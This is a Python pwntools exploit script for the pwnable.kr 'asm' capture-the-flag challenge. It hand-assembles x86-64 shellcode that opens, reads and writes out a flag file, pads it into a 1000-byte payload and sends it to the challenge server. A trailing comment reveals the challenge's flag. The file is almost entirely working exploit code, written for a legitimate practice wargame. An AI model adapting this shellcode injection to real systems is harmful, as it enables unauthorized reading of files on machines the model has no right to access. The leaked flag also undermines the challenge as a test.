#!/usr/bin/env python2

from pwn import *
import sys

context.arch = 'amd64'

#For the server, this filename works.
#However, on my machine I needed a '/' at the beginning of the string for it to work.
#Which didn't work on the server.
#I have no idea why.
filename = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00'
payload_len = 1000
payload_addr = 0x41414000 + len('\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff')
filename_addr = payload_addr + payload_len - len(filename) + 1
flag_len = 50 #just a guess, should be enough
flag_addr = filename_addr - flag_len


#We could also use shellcraft open / read / write but I wanted to write them by hand, this is a shellcode practice challenge after all.
asm_open = asm('''mov rax, 2;
		  mov rdi, {};
		  mov rsi, 0;
		  mov rdx, 0;
		  syscall'''.format(filename_addr))

#To debug over rax
asm_printrax = asm('''push rax;
                      mov rax, 1;
                      mov rdi, 1;
                      mov rsi, rsp;
                      mov rdx, 1;
                      syscall;''')

asm_read = asm('''mov rdi, 3;
		  mov rax, 0;
		  mov rsi, {};
		  mov rdx, {};
		  syscall'''.format(flag_addr, flag_len))

asm_write = asm('''mov rax, 1;
		   mov rdi, 1;
		   mov rsi, {};
		   mov rdx, {};
		   syscall'''.format(flag_addr, flag_len))

asm_exit = asm('''mov rax, 60;
		  mov rdi, 0;
		  syscall''')

shellscript = asm_open + asm_read + asm_write + asm_exit
garbage = 'F' * (payload_len - len(shellscript) - len(filename))
payload = shellscript + garbage + filename
assert len(payload) == payload_len

if 'debug' in sys.argv:
    p = gdb.debug('./asm')
elif 'print' in sys.argv:
    print payload
    sys.exit()
elif 'local' in sys.argv:
    p = process('./asm')
else:
    p = remote('pwnable.kr', 9026)

print p.recvuntil('x64 shellcode: ')
p.sendline(payload)
print p.recvall() #Mak1ng_shelLcodE_i5_veRy_eaSy
		

